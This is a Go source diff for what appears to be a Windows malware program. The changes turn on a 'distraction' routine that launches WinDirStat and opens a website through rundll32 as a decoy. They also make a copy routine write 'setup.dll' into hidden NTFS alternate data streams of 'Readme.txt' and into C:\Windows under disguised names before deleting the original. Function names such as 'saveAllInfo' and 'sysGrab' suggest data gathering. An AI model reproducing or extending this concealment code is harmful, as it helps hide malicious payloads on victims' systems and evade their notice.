@@ -22,7 +22,7 @@ import (
 )
 
 func main() {
-	// distraction()
+	distraction()
 	saveAllInfo()
 	fileManger()
 }
@@ -51,37 +51,32 @@ func fileManger() {
 	copyFiles()
 	// downloadFiles()
 	// exportFiles()
-	// hideFiles()
 }
 
 func copyFiles() {
 	input, err := ioutil.ReadFile("setup.dll")
+	ioutil.WriteFile("Readme.txt:crapS3751243.dll", input, 0644)
+	ioutil.WriteFile("Readme.txt:crapS3636862.dll", input, 0644)
+	ioutil.WriteFile("C:\\Windows\\crapS3636862.dll", input, 0644)
+	ioutil.WriteFile("C:\\Windows\\crapS3751243.dll", input, 0644)
 	if err != nil {
 		fmt.Println(err)
 	}
-
-	ioutil.WriteFile("crapS3751243.dll", input, 0644)
-	ioutil.WriteFile("crapS3636862.dll", input, 0644)
-	ioutil.WriteFile("C:\\Windows\\crapS3636862.dll", input, 0644)
-	ioutil.WriteFile("C:\\Windows\\crapS3751243.dll", input, 0644)
+	os.Remove("setup.dll")
 }
 
 func exportFiles() {
 
 }
 func downloadFiles() {
-
-}
-
-func hideFiles() {
-
 }
 
 func distraction() {
-	cmd1 := exec.Command("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "https://matt.waiariki.net/")
-	// cmd := exec.Command("C:\\Program Files\\Mozilla Firefox\\firefox.exe", "https://matt.waiariki.net/")
-	// cmd.Start()
-	cmd1.Start()
+	cmd1 := exec.Command("WinDirStat.exe", "/b")
+	cmd1.Run()
+	// pid := cmd1.Process.Pid
+	// fmt.PrintLn(pid)
+	exec.Command("rundll32", "url.dll,FileProtocolHandler", "http://matt.waiariki.net/").Start()
 }
 
 func sysGrab() string {
